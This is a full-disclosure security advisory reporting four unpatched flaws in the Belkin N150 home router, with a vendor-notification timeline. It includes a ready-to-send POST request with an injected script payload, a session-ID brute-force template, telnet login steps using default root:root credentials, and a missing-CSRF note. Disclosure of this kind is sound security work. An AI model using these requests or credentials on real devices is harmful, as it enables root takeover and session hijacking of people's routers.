##Full Disclosure:

#Exploit Title      : Belkin N150 Wireless Home Router Multiple
Vulnerabilities
#Exploit Author     : Rahul Pratap Singh
#Date               : 30/Nov/2015
#Home Page Link     : http://www.belkin.com
#Blog Url           : 0x62626262.wordpress.com
#Linkedin           : https://in.linkedin.com/in/rahulpratapsingh94
#Status             : Not Patched

→ Vulnerability/BUG Report :

1)

• Vulnerability Title  :  HTML/Script Injection
• Version              :  F9K1009 v1
• Firmware             :  1.00.09

→ Proof of Concept:

"InternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language" this parameter is
vulnerable.

https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/

→ Steps to Reproduce:

Send the following post request using Burpsuite,etc

POST /cgi-bin/webproc HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101
Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer:
http://192.168.2.1/cgi-bin/webproc?getpage=html/page.html&var:page=deviceinfo&var:oldpage=-
Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 260

%3AInternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language="><script>alert("1")</script><script>"&obj-action=set&var%3Apage=deviceinfo&var%3Aerrorpage=deviceinfo&getpage=html%2Findex.html&errorpage=html%2Findex.html&var%3ACacheLastData=U1BBTl9UaW1lTnVtMT0%3D

2)

• Vulnerability Title  :  Session Hijacking
• Version              :  F9K1009 v1
• Firmware             :  1.00.09

→ Proof of Concept:

Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT

sessionid is allocated using hex encoding and of fixed length i.e 8 .
Therefore, it is very easy to bruteforce it in feasible amount for time as
this session id ranges from 00000000 to ffffffff

→ Steps to Reproduce:

Send the following request using Burpsuite and Bruteforce the sessionid.

POST /cgi-bin/webproc HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101
Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer:
http://192.168.2.1/cgi-bin/webproc?getpage=html/page.html&var:page=deviceinfo&var:oldpage=-
Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT

3)

• Vulnerability Title  :  Telnet Enabled with Default Pass
• Version              :  F9K1009 v1
• Firmware             :  1.00.09

→ Vulnerability Details:

Telnet protocol can be used by an attacker to gain remote access to the
router with root privileges.

→ Proof of Concept:

https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/

→ Steps to Reproduce:

1) Open terminal
2) Type following command:
telnet 192.168.2.1
3) Default user and pass is root:root

4)

• Vulnerability Title  :  Cross Site Request Forgery
• Version              :  F9K1009 v1
• Firmware             :  1.00.09

→ Proof of Concept:

Request doesn't contain any CSRF-token. Therefore, requests can be forged.
It can be verified with any request.

Status:
Vendor Notified: 20 Oct 2015
Vendor Notified Again:  25 Nov 2015

No Response.

Full Disclosure: 30 Nov 2015

Ref:
https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/